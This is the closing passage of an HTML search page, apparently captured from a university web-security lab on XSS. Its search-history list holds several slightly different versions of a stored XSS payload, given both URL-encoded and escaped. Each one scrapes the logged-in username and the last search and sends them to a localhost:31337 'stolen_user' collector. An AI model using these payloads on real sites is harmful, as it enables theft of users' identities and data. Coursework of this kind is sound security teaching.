results.replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=layout" class="history-item list-group-item">layout</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E%27%2C%20%27m%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = new RegExp(&#039;&lt;a href=&quot;search\?q=.*&lt;\/a&gt;&#039;, &#039;m&#039;);         var results = re.exec(data);         console.log(data);         var last_search = results.replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E%27%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20re.exec%28data%29%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = new RegExp(&#039;&lt;a href=&quot;search\?q=.*&lt;\/a&gt;&#039;);         console.log(data);         var last_search = re.exec(data)[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20re.exec%28data%29%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = new RegExp(&#039;&lt;a href=&quot;search\?q=.*&lt;\/a&gt;&#039;);         var last_search = re.exec(data)[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
            </div>
          </div>

        </div>
      </div>

    </div>
  </body>
</html>
